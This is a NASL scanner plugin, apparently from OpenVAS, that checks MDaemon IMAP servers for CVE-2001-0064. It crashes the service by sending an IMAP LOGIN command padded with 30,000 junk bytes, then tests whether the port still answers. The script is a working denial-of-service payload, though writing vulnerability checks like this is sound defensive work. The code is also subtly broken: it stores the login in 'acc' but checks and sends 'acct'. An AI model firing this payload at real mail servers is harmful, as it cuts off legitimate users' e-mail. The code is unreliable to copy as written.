CPE = "cpe:/a:alt-n:mdaemon";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14826" );
	script_version( "2021-02-08T15:30:09+0000" );
	script_tag( name: "last_modification", value: "2021-02-08 15:30:09 +0000 (Mon, 08 Feb 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_bugtraq_id( 2134 );
	script_cve_id( "CVE-2001-0064" );
	script_name( "MDaemon IMAP Server DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_altn_mdaemon_consolidation.sc", "logins.sc" );
	script_require_ports( "Services/imap", 143 );
	script_mandatory_keys( "altn/mdaemon/imap/detected", "imap/login", "imap/password" );
	script_tag( name: "solution", value: "Upgrade to the newest version of this software." );
	script_tag( name: "summary", value: "It is possible to crash the remote MDaemon IMAP server
  by sending a long argument to the 'LOGIN' command." );
	script_tag( name: "impact", value: "This problem allows an attacker to make the remote
  MDaemon server to crash, thus preventing legitimate users from receiving e-mails." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("imap_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
kb_creds = imap_get_kb_creds();
acc = kb_creds["login"];
pass = kb_creds["pass"];
if(!acct || !pass){
	exit( 0 );
}
if(!port = get_app_port( cpe: CPE, service: "imap" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = NASLString( "? LOGIN ", acct, " ", pass, " ", crap( 30000 ), "\\r\\n" );
send( socket: soc, data: s );
d = recv_line( socket: soc, length: 4096 );
close( soc );
soc2 = open_sock_tcp( port );
if(!soc2){
	security_message( port: port );
	exit( 0 );
}
close( soc2 );
exit( 99 );

